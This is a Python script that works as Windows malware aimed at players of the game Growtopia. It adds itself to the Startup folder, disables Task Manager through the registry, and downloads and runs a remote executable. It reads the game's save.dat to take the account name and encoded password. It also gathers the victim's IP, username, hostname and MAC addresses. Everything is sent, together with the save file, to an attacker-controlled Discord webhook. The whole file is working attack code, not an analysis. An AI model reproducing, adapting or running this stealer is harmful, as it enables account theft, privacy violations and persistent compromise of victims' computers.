from discord_webhook import DiscordWebhook, DiscordEmbed
from requests.exceptions import Timeout
import subprocess
import requests
import tempfile
import discord
import psutil
import socket
import shutil
import winreg
import time
import sys
import os
import io

command = False  # "command" or False
file_url = '.../YourFile.exe'  # 'url' or False
wait_for_internet_connection = True  # True/False
copy_executable_to_startup = True  # True/False
disable_task_manager = True  # True/False
webhook_url = 'https://discord.com/api/webhooks/...'  # 'url' or False


def wait_internet_connection():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=10)
            return True
        except ConnectionError:
            time.sleep(20)
            pass


if wait_for_internet_connection:
    print("Waiting for an internet connection...")
    wait_internet_connection()
    print("Internet connection established.")

if copy_executable_to_startup:
    try:
        startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs",
                                           "Startup")
        shutil.copy(sys.executable, startup_folder_path)
        print("Copied to startup successful")
    except Exception as e:
        print(f"Startup error: {e}")

if command:
    try:
        os.system(command)
        print("Command executed successfully")
    except Exception as e:
        print(f"Command error: {e}")

if disable_task_manager:
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
        value_name = 'DisableTaskMgr'
        value_data = 1
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
        winreg.CloseKey(key)
        print("Task manager successfully disabled")
    except Exception as e:
        print(f"Winreg error: {e}")

if file_url:
    file_name = os.path.basename(f"{file_url}")
    temp_directory = tempfile.gettempdir()
    file_path = os.path.join(temp_directory, file_name)

    if os.path.exists(file_path):
        os.popen(f"start {file_path}")
    else:
        while True:
            try:
                response = requests.get(file_url)
                with open(file_path, 'wb') as file:
                    file.write(response.content)
                print(f"Download successful. File saved at: {file_path}")
                os.popen(f"start {file_path}")
                break
            except Exception as e:
                print(f"Download error: {e}")
                time.sleep(20)
                pass

if webhook_url:
    def get_data(content, name):
        try:
            c = content.split(name)
            if len(c) > 1:
                length = ord(c[1][0])
                return ''.join(c[1][4 + x] for x in range(length))
            else:
                return None
        except Exception as e:
            print(f"Get data error: {e}")

    def decode(save_path):
        try:
            with io.open(save_path) as file:
                content = file.read()
            if content:
                content = content.replace("tankid_password_chk2", "")

                grow_id = get_data(content, attr[0])
                last_world = get_data(content, attr[2])
                encoded_password = get_data(content, attr[1])
                return grow_id, last_world, encoded_password
        except Exception as e:
            print(f"Decode error: {e}")

    def get_country_code(ip):
        try:
            response = requests.get(f'https://ipinfo.io/{ip}/json')
            data = response.json()
            return data.get('country', '').lower()
        except Exception as e:
            print(f"Get CC error: {e}")
            return None

    def get_mac_addresses():
        try:
            interfaces = psutil.net_if_addrs()
            mac_addresses = []

            for interface_name, interface_addresses in interfaces.items():
                for address in interface_addresses:
                    if address.family == psutil.AF_LINK:
                        mac_addresses.append(address.address)
            return mac_addresses
        except Exception as e:
            print(f"Get mac addr error: {e}")


    def get_ip():
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            data = response.json()
            public_ip = data['ip']
            return public_ip
        except Exception as e:
            print(f"Get IP error: {e}")
            return None


    def get_username():
        try:
            return os.getlogin()
        except Exception as e:
            print(f"Get username error: {e}")
            return None


    def get_hostname():
        try:
            return socket.gethostname()
        except Exception as e:
            print(f"get_hostname: {e}")
            return None

    attr = ["tankid_name", "tankid_password", "lastworld"]
    save_path = os.path.join(os.environ['LOCALAPPDATA'], "Growtopia", "save.dat")

    webhook = DiscordWebhook(url=webhook_url)
    webhook.timeout = 30

    ip = get_ip()
    embed = DiscordEmbed(title=f":flag_{get_country_code(ip)}: {ip} {get_username()}@{get_hostname()}", color=discord.Color.dark_blue().value)
    if os.path.exists(save_path):
        save = decode(save_path)
        if save:
            embed.add_embed_field(name=":bust_in_silhouette: GrowID", value=f"```{save[0]}```", inline=False)
            embed.add_embed_field(name=":closed_lock_with_key: Password (encoded)", value=f"```{save[2]}```", inline=False)
            embed.add_embed_field(name=":earth_americas: Last world", value=f"```{save[1]}```", inline=False)

    mac_addresses = get_mac_addresses()
    if mac_addresses:
        embed.add_embed_field(name=":pencil: MAC Addresses", value=f"```{mac_addresses}```", inline=False)

    try:
        with open(save_path, "rb") as f:
            webhook.add_file(file=f.read(), filename="save.dat")
    except:
        pass

    webhook.add_embed(embed)
    while True:
        try:
            response = webhook.execute()
            break
        except Timeout as timeout_error:
            print(f"Timeout error: {timeout_error}")
            time.sleep(60)
